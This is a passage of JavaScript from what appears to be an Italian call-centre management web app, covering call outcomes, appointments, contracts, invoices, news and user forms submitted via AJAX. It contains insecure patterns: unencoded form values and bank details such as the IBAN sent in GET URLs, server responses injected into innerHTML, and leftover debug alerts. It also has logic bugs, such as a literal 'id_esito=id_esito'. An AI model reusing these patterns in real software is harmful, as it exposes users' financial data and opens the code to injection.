  //  alert(id_esito);
    var CodCli=document.getElementById('CodCli').value;
    var idlogin=document.getElementById('idlogin').value;
  //  var stato=document.getElementById('stato').valuedocument.getElementById("note_chiamata_agenti").value;
var note_chiamata=document.getElementById("note_chiamata_agenti").value;
//var priorita=document.getElementById("priorita").value;
//alert("note_chiamata");
    if (!isNaN(id_esito)){
    //alert(stato);
    //   window.alert("tipologia: "+tipologia+" esito:"+id_esito);
    var id  = select.id;
    var index    = document.getElementById(id).selectedIndex;
    //alert(index);
    var option   = select.options[index];
    //alert(option);
    var text     = option.text;

    //alert(text);
    //    if(id_esito==31){
            // document.getElementById("docontractdiv"o).innerHTML=include_once("contratto.php");;
      //       document.getElementById("div_bonifico").style.display = "block";
      //          doOpacity('div_bonifico');


     //   } else {
    if ((id_esito==700)||(id_esito==5000) || (id_esito==80000)){
               document.getElementById("div_appuntamento").style.display = "block";
                doOpacity('div_appuntamento');


    }
    else {
     //  alert(id_esito);

 //   if (id_esito>=12){
        //           document.getElementById("caseselect2").style.visibility = "hidden";

        //      document.getElementById("docontractdiv").style.display="block";
        //        document.getElementById("docontractdiv").style.visibility="visible";
//MODIFICA 
            if((id_esito==5000000000)){
            alert("sonoqui");
            ////OLDCONTRATTO
            // document.getElementById("docontractdiv"o).innerHTML=include_once("contratto.php");;
            document.getElementById("docontractdiv").style.display="block";
            document.getElementById("docontractdiv").style.visibility="visible";
            document.getElementById("doinfoaggdiv").style.display="none";
            document.getElementById("doinfoaggdiv").style.visibility="hidden";
            document.getElementById("imgdett").style.visibility="hidden";


        }
       

 
    else {
        ajax = getXmlHttpObject();
        if(ajax) {
            ajax.onreadystatechange = function(){
               // var response = "";
                if(ajax.readyState == 4){
                    response = ajax.responseText;
//alert(response);
                    window.location.href="index.php";
 

                }

            }
            ajax.open("GET","function/ajax.php?esita_contatto="+id_esito+"&dialer_data="+dialer_data+"&id_richiesta="+CodCli+"&idlogin="+idlogin+"&note_chiamata="+note_chiamata);
            ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded; charset=UTF-8");
            ajax.send(null);
        }
    }
   }
//   }
    }
}

function doExitContrateClosed(value){
  // alert("sonoqui");
   // var value  = select.value;
    // alert(value);
    var arr_value = value.split(':');
    var dialer_data = arr_value[0];
  //  alert(dialer_data);
    //dialer_data = parseInt(tipologia);
    var id_esito = arr_value[1]; // document.getElementById(id).value;
    id_esito = parseInt(id_esito);
 // alert(id_esito);
    var CodCli=document.getElementById('id_richiesta').value;
    var idlogin=document.getElementById('idlogin').value;
    alert(idlogin);
       // var stato=document.getElementById('stato').value;
        var oggi = getToday("ita");
        // preparo i dati dell'appuntamento
        var data   = document.getElementById("data").value;
        var ora    = document.getElementById("ora").value;
        var minuti = document.getElementById("minuti").value;
        var text   = document.getElementById("note_appuntamento").value;
        var note_chiamata=document.getElementById("note_della_chiamata").value;
        var priorita=document.getElementById("priorita").value;
        var data_bonifico=document.getElementById("datab").value;
        var cro=document.getElementById("cro").value;
        var iban=document.getElementById("iban").value;

        ajax = getXmlHttpObject();
        if(ajax) {
            ajax.onreadystatechange = function(){
                var response = "";
                if(ajax.readyState == 4){
                    response = ajax.responseText;
alert(response);


               //     closewinreg();
                   window.location.href="index.php";
 


                }

            }
            ajax.open("GET","function/ajax.php?esita_contatto="+id_esito+"&dialer_data="+dialer_data+"&id_richiesta="+CodCli+"&idlogin="+idlogin+"&data="+data+"&ora="+ora+"&minuti="+minuti+"&text="+text+"&note_chiamata="+note_chiamata+"&priorita="+priorita+"&cro="+cro+"&data_bonifico="+data_bonifico+"&iban="+iban);
            ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded; charset=UTF-8");
            ajax.send(null);
        }




}
function doExitContrateClosedpag(value){
  // alert("sonoqui");
   // var value  = select.value;
    // alert(value);
    var arr_value = value.split(':');
    var dialer_data = arr_value[0];
  //  alert(dialer_data);
    //dialer_data = parseInt(tipologia);
    var id_esito = arr_value[1]; // document.getElementById(id).value;
    id_esito = parseInt(id_esito);
  //  alert(id_esito);
    var note_chiamata=document.getElementById("note_della_chiamata").value;
        
    var CodCli=document.getElementById('id_richiesta').value;
    var idlogin=document.getElementById('agentevt').value;
        //var stato=document.getElementById('stato').value;
        var oggi = getToday("ita");
        // preparo i dati dell'appuntamento

        ajax = getXmlHttpObject();
        if(ajax) {
            ajax.onreadystatechange = function(){
                var response = "";
                if(ajax.readyState == 4){
                    response = ajax.responseText;
//alert(response);


               //     closewinreg();
                   window.location.href="index.php";



                }

            }
            ajax.open("GET","function/ajax.php?esita_contatto="+id_esito+"&dialer_data="+dialer_data+"&id_richiesta="+CodCli+"&idlogin="+idlogin+"&note_chiamata="+note_chiamata);
            ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded; charset=UTF-8");
            ajax.send(null);
        }




}

function shownoteapp(idrich){
     document.getElementById('noteapp').value="";
    ajax = getXmlHttpObject();
        if(ajax) {
            ajax.onreadystatechange = function(){
                var response = "";
                if(ajax.readyState == 4){
                    response = ajax.responseText;
                    arrayelemeti=response.split("----");

                    document.getElementById('noteapp').value=arrayelemeti[0];
                    document.getElementById('noterich').value=arrayelemeti[1]
//alert(response);


               //     closewinreg();
                  // window.location.href="index.php";



                }

            }
            ajax.open("GET","function/ajax.php?cercanote="+idrich);
            ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded; charset=UTF-8");
            ajax.send(null);
        }
}
function attivaazienda(elemento){
  
    if(elemento.checked){
          document.getElementById("azienda").style.visibility="visible";
          document.getElementById("indazienda1").style.visibility="visible";
          document.getElementById("indazienda2").style.visibility="visible";
    }
    else     {
        document.getElementById("azienda").style.visibility="hidden";
         document.getElementById("indazienda1").style.visibility="hidden";
          document.getElementById("indazienda2").style.visibility="hidden";
    }
}
function reloadpage(){
    //location.reload(false);
     location.reload();
}
function reloadpagepag(){
 
    //location.reload(false);
     window.location.href="pagevisualizzapagamenti.php";
}
function closewinreg(){

    parent.dhxWins.window("wesita").close();
    winvocisCreate=false;
   
}

function doCaseSelectpag(){
     //document.getElementById("imgdett").style.visibility="visible";
    var esito_chiamata=document.getElementById("esito_chiamata").value;

    if(document.getElementById("esito_chiamata").disabled == "disabled"){
        document.getElementById("esito_chiamata").setAttribute("disabled", "");
    }
    //  if (esito_chiamata <12){
    // distruggo oggetto tabbar
    tabcontract=null;
    tabiscreate=false;
    // ------------------
    ajax = getXmlHttpObject();
    // nascondo il contratto:
    document.getElementById("docontractdiv").style.display="none";
    document.getElementById("docontractdiv").style.visibility="hidden";
  document.getElementById("caseselect2").style.visibility = "hidden";

    // mostro la seconda select:
     if(ajax) {
        ajax.onreadystatechange = resultDoSelectpag;
        ajax.open("GET", "function/ajax.php?esito_chiamatapag="+esito_chiamata);
        ajax.send(null);
    }
    else {
        document.write("Impossibile caricare il Componente xmlhttprequest");
    }
}
function resultDoSelectpag(){
    var response = "";

    if(ajax.readyState == 4){
        response = ajax.responseText;
  document.getElementById("caseselect2").style.visibility = "visible";

        document.getElementById("caseselect2").innerHTML=response;

    }

}




function doCaseSelect(){
     document.getElementById("imgdett").style.visibility="visible";
    var esito_chiamata=document.getElementById("esito_chiamata").value;

    if(document.getElementById("esito_chiamata").disabled == "disabled"){
        document.getElementById("esito_chiamata").setAttribute("disabled", "");
    }
    var note_chiama="";
    note_chiama=document.getElementById("note_chiamata_agenti").value;
    var y = note_chiama.length;
    //alert (y);
    if (y=="")
    {
        alert("Prima di esitare inserisci le note");
        document.getElementById("esito_chiamata").value="";
    }
    else {
            //  if (esito_chiamata <12){
            // distruggo oggetto tabbar
            tabcontract=null;
            tabiscreate=false;
            // ------------------
            ajax = getXmlHttpObject();
            // nascondo il contratto:
            document.getElementById("docontractdiv").style.display="none";
            document.getElementById("docontractdiv").style.visibility="hidden";
          document.getElementById("caseselect2").style.visibility = "hidden";

            // mostro la seconda select:
             if(ajax) {
                ajax.onreadystatechange = resultDoSelect;
                ajax.open("GET", "function/ajax.php?esito_chiamata="+esito_chiamata);
                ajax.send(null);
            }
            else {
                document.write("Impossibile caricare il Componente xmlhttprequest");
            }
        // }
        // else {
        // CONTRATTO:
        //document.getElementById("caseselect2").style.visibility = "hidden";
        // document.getElementById("docontractdiv").style.display="block";
        //   document.getElementById("docontractdiv").style.visibility="visible";


//}
    }
}
function resultDoSelect(){
    var response = "";

    if(ajax.readyState == 4){
        response = ajax.responseText;
  document.getElementById("caseselect2").style.visibility = "visible";

        document.getElementById("caseselect2").innerHTML=response;

    }

}
function functionlogout(){
    //alert(login);
    //alert(password);
    ajax = getXmlHttpObject();
    // alert(ajax);
    if(ajax) {
        //var id_operatore=document.getElementById("id_operatore").value;
        ajax.onreadystatechange = resultLogout;
        //  alert("./function/ajax.php?login="+login+"&password="+password);
        ajax.open("GET", "./function/ajax.php?logout=true");
        ajax.send(null);
        	
    }
    else {
        document.write("Impossibile caricare il Componente xmlhttprequest");
    }
}

function resultLogout(){
    var response = "";
    if(ajax.readyState == 4){
        response = ajax.responseText;

        alert(response);
        if(response == "ok"){

             $(window.location).attr('href', 'index.php');
              $( "#menu" ).css("display", "hidden");
        }
        else {
              $(window.location).attr('href', 'index.php');
        	$( "#menu" ).html("");
     }
    }
}

function aggiornaappu(){
    //alert(login);
    //alert("password");
    ajax = getXmlHttpObject();
    // alert(ajax);
    if(ajax) {
        //var id_operatore=document.getElementById("id_operatore").value;
        ajax.onreadystatechange = resultAggiornaappu;
        //  alert("./function/ajax.php?login="+login+"&password="+password);
        ajax.open("GET", "./function/ajax.php?aggappu=true");
        ajax.send(null);
    }
    else {
        document.write("Impossibile caricare il Componente xmlhttprequest");
    }
}


function resultAggiornaappu(){
    var response = "";
    if(ajax.readyState == 4){
        response = ajax.responseText;

         //alert(response);
     //  window.opener.
  //   self.opener.document.getElementById('divappu').innerHTML=response;

           document.getElementById('divappu').innerHTML=response
    //   document.;

    // window.location.assign("index.php?login=falso");

    //else window.location.assign("index.php?login=falso");
    }
}

function lastCheckContract(){
    var error = false;
    // prime 3 select obbligatorie e due input text obbligatorie:
    var array1 = new Array(5);
    array1[0] = "nome";
    array1[1] = "cognome";
    array1[2] = "codicelinea";
array1[3] = "sesso";
array1[4] = "corsopreso";
array1[5] = "dettaglio_corso";
array1[7] = "prezzo";

 select=document.getElementById('esito_chiamata2').value;
      var arr_value = select.split(':');
    //dialer_data = parseInt(tipologia);
    var id_esito = arr_value[1]; // document.getElementById(id).value;
    id_esito = parseInt(id_esito);

if (id_esito!=26){
array1[5] = "codicefiscale";
array1[6] = "dettaglio_corso";

}
else array1[5] = "dettaglio_corso";

//  primo controllo
    for(i=0;i<array1.length;i++){
        if(document.getElementById(array1[i]) != null){
            var tmp_value = document.getElementById(array1[i]).value;
            if(tmp_value.length == 0){
                if (document.getElementById(array1[i]).name=="input"){
                    document.getElementById(array1[i]).style.background="red";
                    document.getElementById(array1[i]).style.color="white";
                }
                else document.getElementById(array1[i]).style.border = "solid 1px red";
                error = true;
            //  break;
            }
        }
    }
    


    if(!error){
        // non ci sono errori nell'ultimo tab

            if (window.confirm("Procedo con inserimento dati")){
            postContract();
		}

        
    }
    else window.alert("Bisogna valorizzare tutti i campi obbligatori");

}

function postContract(){
    var stringa="";


    var value  = document.getElementById('esito_chiamata2').value;
    // alert(value);
    var arr_value = value.split(':');
    var dialer_data = arr_value[0];
    //dialer_data = parseInt(tipologia);
    var id_esito = arr_value[1]; // document.getElementById(id).value;
    id_esito = parseInt(id_esito);
    //alert(id_esito);
  query="contract=true&id_esito=id_esito&";


    var frm=document.forms.formcontract;
    var nelementi=frm.elements.length;

    //winAppointment.window('persAppointment').park();
    for (var i=0; i<nelementi; i++){
        //   if (encodeURIComponent(frm.elements[i].value)=""){


        if (i<nelementi-1){
            if (encodeURIComponent(frm.elements[i].value)!=""){

                query+=frm.elements[i].name+"="+encodeURIComponent(frm.elements[i].value)+"&";
            }
        //    else  {
          //      query+=frm.elements[i].name+"=" +"0&";
          //  }

        // query+=frm.elements[i].name+"="+frm.elements[i].value+"&";
        }
        else {
            if (encodeURIComponent(frm.elements[i].value)!=""){

                query+=frm.elements[i].name+"="+encodeURIComponent(frm.elements[i].value);
            }
      //      else query+=frm.elements[i].name+"=0";
        //query+=frm.elements[i].name+"="+frm.elements[i].value;
        }
    //  }
    }
   //   alert(query);
    ajax = getXmlHttpObject();
    if(ajax) {
        ajax.onreadystatechange = resultpostcontract;
        ajax.open("POST","function/ajax.php",true);
        ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded; charset=UTF-8");
        ajax.send(query);
    }

}



function resultpostcontract (){
    var response = "";

    if(ajax.readyState == 4)
    {
        response = ajax.responseText;
        // alert(response);
        //document.getElementById("note").value=response;
       // if(response == "ok")
        //{
            select=document.getElementById('esito_chiamata2').value;
    var value  = document.getElementById('esito_chiamata2').value;
    // alert(value);
    var arr_value = value.split(':');
    var dialer_data = arr_value[0];
    //dialer_data = parseInt(tipologia);
    var id_esito = arr_value[1]; // document.getElementById(id).value;
    id_esito = parseInt(id_esito);
// if(id_esito==26){
  //  document.getElementById("div_appuntamento").style.display = "block";
    //            doOpacity('div_appuntamento');}
      //      else {
                //           document.getElementById("div_bonifico").style.display = "block";
               //doOpacity('div_bonifico');
                 document.getElementById("persim").style.display = "block";

        //    }
          
          //  alert(select);

          //  doExitContrateClosed(select);

            //alert("Dati Inseriti Correttamente");
           
            //UPDATE ESITO CHIAMATA COME CONTRATTO
        // document.location.reload();
       // }
        //else {
         //   alert(response);
        // alert("Attenzione Inserimento non riuscito Correttamente")
        //}

    }
    
}

function postContractsim(){
    var stringa="";


    var value  = document.getElementById('esito_chiamata2').value;
    // alert(value);
    var arr_value = value.split(':');
    var dialer_data = arr_value[0];
    //dialer_data = parseInt(tipologia);
    var id_esito = arr_value[1]; // document.getElementById(id).value;
    id_esito = parseInt(id_esito);
    //alert(id_esito);
  query="contractsim=true&";


    var frm=document.forms.formcontractsim;
    var nelementi=frm.elements.length;

    //winAppointment.window('persAppointment').park();
    for (var i=0; i<nelementi; i++){
        //   if (encodeURIComponent(frm.elements[i].value)=""){


        if (i<nelementi-1){
            if (encodeURIComponent(frm.elements[i].value)!=""){

                query+=frm.elements[i].name+"="+encodeURIComponent(frm.elements[i].value)+"&";
            }
        //    else  {
          //      query+=frm.elements[i].name+"=" +"0&";
          //  }

        // query+=frm.elements[i].name+"="+frm.elements[i].value+"&";
        }
        else {
            if (encodeURIComponent(frm.elements[i].value)!=""){

                query+=frm.elements[i].name+"="+encodeURIComponent(frm.elements[i].value);
            }
      //      else query+=frm.elements[i].name+"=0";
        //query+=frm.elements[i].name+"="+frm.elements[i].value;
        }
    //  }
    }
     alert(query);
    ajax = getXmlHttpObject();
    if(ajax) {
        ajax.onreadystatechange = resultpostcontractsim;
        ajax.open("POST","function/ajax.php",true);
        ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded; charset=UTF-8");
        ajax.send(query);
    }

}



function resultpostcontractsim (){
    var response = "";

    if(ajax.readyState == 4)
    {
        response = ajax.responseText;
      alert(response);
      alert("qui2");
        //document.getElementById("note").value=response;
       // if(response == "ok")
        //{
            select=document.getElementById('esito_chiamata2').value;
    var value  = document.getElementById('esito_chiamata2').value;
    // alert(value);
    var arr_value = value.split(':');
    var dialer_data = arr_value[0];
    //dialer_data = parseInt(tipologia);
    var id_esito = arr_value[1]; // document.getElementById(id).value;
    id_esito = parseInt(id_esito);
// if(id_esito==26){
  //  document.getElementById("div_appuntamento").style.display = "block";
    //            doOpacity('div_appuntamento');}
      //      else {
                //           document.getElementById("div_bonifico").style.display = "block";
               //doOpacity('div_bonifico');
                 document.getElementById("persim").style.display = "block";

        //    }
          
          //  alert(select);

          //  doExitContrateClosed(select);

            //alert("Dati Inseriti Correttamente");
           
            //UPDATE ESITO CHIAMATA COME CONTRATTO
        // document.location.reload();
       // }
        //else {
         //   alert(response);
        // alert("Attenzione Inserimento non riuscito Correttamente")
        //}

    }
    
}






/////
function lastCheckContractpag(){
    var error = false;
    // prime 3 select obbligatorie e due input text obbligatorie:
    var array1 = new Array(10);
    array1[0] = "nome";
    array1[1] = "cognome";
    array1[2] = "codicelinea";
array1[3] = "sesso";
array1[4] = "corsopreso";
array1[5] = "dettaglio_corso";
array1[7] = "prezzo";
array1[8] = "data_saldo";
array1[9] = "acconto";
 select=document.getElementById('esito_chiamata2').value;
      var arr_value = select.split(':');
    //dialer_data = parseInt(tipologia);
    var id_esito = arr_value[1]; // document.getElementById(id).value;
    id_esito = parseInt(id_esito);

if (id_esito!=26){
array1[5] = "codicefiscale";
array1[6] = "dettaglio_corso";

}
else array1[5] = "dettaglio_corso";

//  primo controllo
    for(i=0;i<array1.length;i++){
        if(document.getElementById(array1[i]) != null){
            var tmp_value = document.getElementById(array1[i]).value;
            if(tmp_value.length == 0){
                if (document.getElementById(array1[i]).name=="input"){
                    document.getElementById(array1[i]).style.background="red";
                    document.getElementById(array1[i]).style.color="white";
                }
                else document.getElementById(array1[i]).style.border = "solid 1px red";
                error = true;
            //  break;
            }
        }
    }



    if(!error){
        // non ci sono errori nell'ultimo tab

            if (window.confirm("Procedo con inserimento dati")){
            postContractpag();
		}


    }
    else window.alert("Bisogna valorizzare tutti i campi obbligatori");

}

function postContractpag(){
    var stringa="";


    var value  = document.getElementById('esito_chiamata2').value;
    // alert(value);
    var arr_value = value.split(':');
    var dialer_data = arr_value[0];
    //dialer_data = parseInt(tipologia);
    var id_esito = arr_value[1]; // document.getElementById(id).value;
    id_esito = parseInt(id_esito);
    //alert(id_esito);
  query="contractpag=true&id_esito=id_esito&";


    var frm=document.forms.formcontract;
    var nelementi=frm.elements.length;

    //winAppointment.window('persAppointment').park();
    for (var i=0; i<nelementi; i++){
        //   if (encodeURIComponent(frm.elements[i].value)=""){


        if (i<nelementi-1){
            if (encodeURIComponent(frm.elements[i].value)!=""){

                query+=frm.elements[i].name+"="+encodeURIComponent(frm.elements[i].value)+"&";
            }
        //    else  {
          //      query+=frm.elements[i].name+"=" +"0&";
          //  }

        // query+=frm.elements[i].name+"="+frm.elements[i].value+"&";
        }
        else {
            if (encodeURIComponent(frm.elements[i].value)!=""){

                query+=frm.elements[i].name+"="+encodeURIComponent(frm.elements[i].value);
            }
      //      else query+=frm.elements[i].name+"=0";
        //query+=frm.elements[i].name+"="+frm.elements[i].value;
        }
    //  }
    }
//      alert(query);
      //document.getElementById('note_contratto').text=query;
    ajax = getXmlHttpObject();
    if(ajax) {
        ajax.onreadystatechange = resultpostcontractpag;
        ajax.open("POST","function/ajax.php",true);
        ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded; charset=UTF-8");
        ajax.send(query);
    }

}



function resultpostcontractpag (){
    var response = "";

    if(ajax.readyState == 4)
    {
        response = ajax.responseText;
       //  alert(response);
        //document.getElementById("note").value=response;
       // if(response == "ok")
        //{
            select=document.getElementById('esito_chiamata2').value;
    var value  = document.getElementById('esito_chiamata2').value;
    // alert(value);
    var arr_value = value.split(':');
    var dialer_data = arr_value[0];
    //dialer_data = parseInt(tipologia);
    var id_esito = arr_value[1]; // document.getElementById(id).value;
    id_esito = parseInt(id_esito);

          //  alert(select);
doExitContrateClosedpag(select);
    }
}

//FATTU_RA

function lastCheckfatt(){
    var error = false;
    // prime 3 select obbligatorie e due input text obbligatorie:
    var array1 = new Array(5);
    array1[0] = "data_fattura";
    array1[1] = "n_fattura";

    for(i=0;i<array1.length;i++){
        if(document.getElementById(array1[i]) != null){
            var tmp_value = document.getElementById(array1[i]).value;
            if(tmp_value.length == 0){
                if (document.getElementById(array1[i]).name=="input"){
                    document.getElementById(array1[i]).style.background="red";
                    document.getElementById(array1[i]).style.color="white";
                }
                else document.getElementById(array1[i]).style.border = "solid 1px red";
                error = true;
            //  break;
            }
        }
    }



    if(!error){
        // non ci sono errori nell'ultimo tab

            if (window.confirm("Procedo con inserimento dati")){
            postfatt();
		}


    }
    else window.alert("Bisogna valorizzare tutti i campi obbligatori");

}

function postfatt(){
    var stringa="";


    //alert(id_esito);
  query="contractfatt=true&";


    var frm=document.forms.formpostfatt;
    var nelementi=frm.elements.length;

    //winAppointment.window('persAppointment').park();
    for (var i=0; i<nelementi; i++){
        //   if (encodeURIComponent(frm.elements[i].value)=""){


        if (i<nelementi-1){
            if (encodeURIComponent(frm.elements[i].value)!=""){

                query+=frm.elements[i].name+"="+encodeURIComponent(frm.elements[i].value)+"&";
            }
        }
        else {
            if (encodeURIComponent(frm.elements[i].value)!=""){

                query+=frm.elements[i].name+"="+encodeURIComponent(frm.elements[i].value);
            }
        }
    }
    ajax = getXmlHttpObject();
    if(ajax) {
        ajax.onreadystatechange = resultpostcontractfatt;
        ajax.open("POST","function/ajax.php",true);
        ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded; charset=UTF-8");
        ajax.send(query);
    }

}


//NEWS

function lastChecknews(){
    var error = false;
    // prime 3 select obbligatorie e due input text obbligatorie:
    var array1 = new Array(5);
    array1[0] = "descrizione";
    array1[1] = "Titolo_News";
    array1[2] = "active";

    for(i=0;i<array1.length;i++){
        if(document.getElementById(array1[i]) != null){
            var tmp_value = document.getElementById(array1[i]).value;
            if(tmp_value.length == 0){
                if (document.getElementById(array1[i]).name=="input"){
                    document.getElementById(array1[i]).style.background="red";
                    document.getElementById(array1[i]).style.color="white";
                }
                else document.getElementById(array1[i]).style.border = "solid 1px red";
                error = true;
            //  break;
            }
        }
    }



    if(!error){
        // non ci sono errori nell'ultimo tab

            if (window.confirm("Procedo con inserimento dati")){
            postnews();
		}


    }
    else window.alert("Bisogna valorizzare tutti i campi obbligatori");

}



function lastCheckuser(){
    var error = false;
    // prime 3 select obbligatorie e due input text obbligatorie:
    var array1 = new Array(5);
    array1[0] = "username";
    array1[1] = "password";
    array1[2] = "active";

    for(i=0;i<array1.length;i++){
        if(document.getElementById(array1[i]) != null){
            var tmp_value = document.getElementById(array1[i]).value;
            if(tmp_value.length == 0){
                if (document.getElementById(array1[i]).name=="input"){
                    document.getElementById(array1[i]).style.background="red";
                    document.getElementById(array1[i]).style.color="white";
                }
                else document.getElementById(array1[i]).style.border = "solid 1px red";
                error = true;
            //  break;
            }
        }
    }



    if(!error){
        // non ci sono errori nell'ultimo tab

            if (window.confirm("Procedo con inserimento dati")){
            postuser();
		}


    }
    else window.alert("Bisogna valorizzare tutti i campi obbligatori");

}

function postuser(){
    var stringa="";


    //alert(id_esito);
  query="postuser=true&";


    var frm=document.forms.formpostfatt;
    var nelementi=frm.elements.length;

    //winAppointment.window('persAppointment').park();
    for (var i=0; i<nelementi; i++){
        //   if (encodeURIComponent(frm.elements[i].value)=""){


        if (i<nelementi-1){
            if (encodeURIComponent(frm.elements[i].value)!=""){

                query+=frm.elements[i].name+"="+encodeURIComponent(frm.elements[i].value)+"&";
            }
        }
        else {
            if (encodeURIComponent(frm.elements[i].value)!=""){

                query+=frm.elements[i].name+"="+encodeURIComponent(frm.elements[i].value);
            }
        }
    }
    //alert(query);
    ajax = getXmlHttpObject();
    if(ajax) {
        ajax.onreadystatechange = resultpostuser;
        ajax.open("POST","function/ajax.php",true);
        ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded; charset=UTF-8");
        ajax.send(query);
    }

}
function resultpostuser (){
    var response = "";
var id_adesione;
    if(ajax.readyState == 4)
    {
        response = ajax.responseText;
        alert(response);
 //alert("NEWS");
window.location.assign("pageaadduser.php");
    }
}

// CORSO!!!!

function lastCheckcorso(){
    var error = false;
    // prime 3 select obbligatorie e due input text obbligatorie:
    var array1 = new Array(5);
    array1[0] = "username";
    array1[1] = "password";
    array1[2] = "active";

    for(i=0;i<array1.length;i++){
        if(document.getElementById(array1[i]) != null){
            var tmp_value = document.getElementById(array1[i]).value;
            if(tmp_value.length == 0){
                if (document.getElementById(array1[i]).name=="input"){
                    document.getElementById(array1[i]).style.background="red";
                    document.getElementById(array1[i]).style.color="white";
                }
                else document.getElementById(array1[i]).style.border = "solid 1px red";
                error = true;
            //  break;
            }
        }
    }



    if(!error){
        // non ci sono errori nell'ultimo tab

            if (window.confirm("Procedo con inserimento dati")){
            postcorso();
		}


    }
    else window.alert("Bisogna valorizzare tutti i campi obbligatori");

}

function postcorso(){
    var stringa="";


    //alert(id_esito);
  query="postcorso=true&";


    var frm=document.forms.formpostfatt;
    var nelementi=frm.elements.length;

    //winAppointment.window('persAppointment').park();
    for (var i=0; i<nelementi; i++){
        //   if (encodeURIComponent(frm.elements[i].value)=""){


        if (i<nelementi-1){
            if (encodeURIComponent(frm.elements[i].value)!=""){

                query+=frm.elements[i].name+"="+encodeURIComponent(frm.elements[i].value)+"&";
            }
        }
        else {
            if (encodeURIComponent(frm.elements[i].value)!=""){

                query+=frm.elements[i].name+"="+encodeURIComponent(frm.elements[i].value);
            }
        }
    }
    //alert(query);
    ajax = getXmlHttpObject();
    if(ajax) {
        ajax.onreadystatechange = resultpostcorso;
        ajax.open("POST","function/ajax.php",true);
        ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded; charset=UTF-8");
        ajax.send(query);
    }

}
function resultpostcorso (){
    var response = "";
var id_adesione;
    if(ajax.readyState == 4)
    {
        response = ajax.responseText;
        alert(response);
 //alert("NEWS");
window.location.assign("pageaaddcorsi.php");
    }
}

// MODDETTCORSO

function lastCheckdettcorsi(){
    var error = false;
    // prime 3 select obbligatorie e due input text obbligatorie:
    var array1 = new Array(5);
    array1[0] = "username";
    array1[1] = "password";
    array1[2] = "active";

    for(i=0;i<array1.length;i++){
        if(document.getElementById(array1[i]) != null){
            var tmp_value = document.getElementById(array1[i]).value;
            if(tmp_value.length == 0){
                if (document.getElementById(array1[i]).name=="input"){
                    document.getElementById(array1[i]).style.background="red";
                    document.getElementById(array1[i]).style.color="white";
                }
                else document.getElementById(array1[i]).style.border = "solid 1px red";
                error = true;
            //  break;
            }
        }
    }



    if(!error){
        // non ci sono errori nell'ultimo tab

            if (window.confirm("Procedo con inserimento dati")){
            postcorsodettmod();
		}


    }
    else window.alert("Bisogna valorizzare tutti i campi obbligatori");

}

function postcorsodettmod(){
    var stringa="";


    //alert(id_esito);
  query="postcorsodett=true&";


    var frm=document.forms.formpostfatt;
    var nelementi=frm.elements.length;

    //winAppointment.window('persAppointment').park();
    for (var i=0; i<nelementi; i++){
        //   if (encodeURIComponent(frm.elements[i].value)=""){


        if (i<nelementi-1){
            if (encodeURIComponent(frm.elements[i].value)!=""){

                query+=frm.elements[i].name+"="+encodeURIComponent(frm.elements[i].value)+"&";
            }
        }
        else {
            if (encodeURIComponent(frm.elements[i].value)!=""){

                query+=frm.elements[i].name+"="+encodeURIComponent(frm.elements[i].value);
            }
        }
    }
    //alert(query);
    ajax = getXmlHttpObject();
    if(ajax) {
        ajax.onreadystatechange = resultpostcorsodett;
        ajax.open("POST","function/ajax.php",true);
        ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded; charset=UTF-8");
        ajax.send(query);
    }

}
function resultpostcorsodett (){
    var response = "";
var id_adesione;
    if(ajax.readyState == 4)
    {
        response = ajax.responseText;
        alert(response);
 //alert("NEWS");
window.location.assign("pageaaddcorsi.php");
    }
}



function postnews(){
    var stringa="";


    //alert(id_esito);
  query="postnews=true&";


    var frm=document.forms.formpostfatt;
    var nelementi=frm.elements.length;

    //winAppointment.window('persAppointment').park();
    for (var i=0; i<nelementi; i++){
        //   if (encodeURIComponent(frm.elements[i].value)=""){


        if (i<nelementi-1){
            if (encodeURIComponent(frm.elements[i].value)!=""){

                query+=frm.elements[i].name+"="+encodeURIComponent(frm.elements[i].value)+"&";
            }
        }
        else {
            if (encodeURIComponent(frm.elements[i].value)!=""){

                query+=frm.elements[i].name+"="+encodeURIComponent(frm.elements[i].value);
            }
        }
    }
    ajax = getXmlHttpObject();
    if(ajax) {
        ajax.onreadystatechange = resultpostnews;
        ajax.open("POST","function/ajax.php",true);
        ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded; charset=UTF-8");
        ajax.send(query);
    }

}
function resultpostnews (){
    var response = "";
var id_adesione;
    if(ajax.readyState == 4)
    {
        response = ajax.responseText;
        //alert(response);
 //alert("NEWS");
window.location.assign("pageavisualizzanews.php");
    }
}


function lastChecknewsins(){
    var error = false;
    // prime 3 select obbligatorie e due input text obbligatorie:
    var array1 = new Array(5);
    array1[0] = "descrizione";
    array1[1] = "Titolo_News";
    array1[2] = "active";

    for(i=0;i<array1.length;i++){
        if(document.getElementById(array1[i]) != null){
            var tmp_value = document.getElementById(array1[i]).value;
            if(tmp_value.length == 0){
                if (document.getElementById(array1[i]).name=="input"){
                    document.getElementById(array1[i]).style.background="red";
                    document.getElementById(array1[i]).style.color="white";
                }
                else document.getElementById(array1[i]).style.border = "solid 1px red";
                error = true;
            //  break;
            }
        }
    }



    if(!error){
        // non ci sono errori nell'ultimo tab

            if (window.confirm("Procedo con inserimento dati")){
            postnewsins();
		}


    }
    else window.alert("Bisogna valorizzare tutti i campi obbligatori");

}

function postnewsins(){
    var stringa="";


    //alert(id_esito);
  query="postnewsins=true&";


    var frm=document.forms.formpostfatt;
    var nelementi=frm.elements.length;

    //winAppointment.window('persAppointment').park();
    for (var i=0; i<nelementi; i++){
        //   if (encodeURIComponent(frm.elements[i].value)=""){


        if (i<nelementi-1){
            if (encodeURIComponent(frm.elements[i].value)!=""){

                query+=frm.elements[i].name+"="+encodeURIComponent(frm.elements[i].value)+"&";
            }
        }
        else {
            if (encodeURIComponent(frm.elements[i].value)!=""){

                query+=frm.elements[i].name+"="+encodeURIComponent(frm.elements[i].value);
            }
        }
    }
    ajax = getXmlHttpObject();
    if(ajax) {
        ajax.onreadystatechange = resultpostnewsins;
        ajax.open("POST","function/ajax.php",true);
        ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded; charset=UTF-8");
